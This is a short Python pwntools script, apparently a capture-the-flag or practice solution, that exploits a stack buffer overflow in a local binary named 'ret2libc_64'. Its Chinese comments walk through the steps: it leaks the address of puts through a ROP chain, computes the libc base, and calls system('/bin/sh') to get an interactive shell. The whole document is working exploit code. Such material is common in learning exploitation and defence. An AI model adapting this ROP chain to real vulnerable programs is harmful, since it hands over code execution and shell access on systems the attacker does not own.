from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./ret2libc_64')
elf=ELF('./ret2libc_64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#首先要先计算一个已执行函数的地址，就选puts吧
pop_rdi_ret=0x400763
ret=0x400509
offset = 24
# gdb.attach(p,'b *0x4006d9')
payload1 = offset*b'a' + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
p.sendline(payload1)
puts_address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(puts_address)
# 获取到地址之后要再执行一次vuln函数调用read栈溢出漏洞执行system
# 先计算基地址和所需要的函数和参数的地址
libc_base = puts_address - libc.sym['puts']
system = libc_base + libc.sym['system']
bin_sh= libc_base + next(libc.search(b"/bin/sh"))
payload2 = offset*b'a' + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
p.sendline(payload2)
# pause()
p.interactive()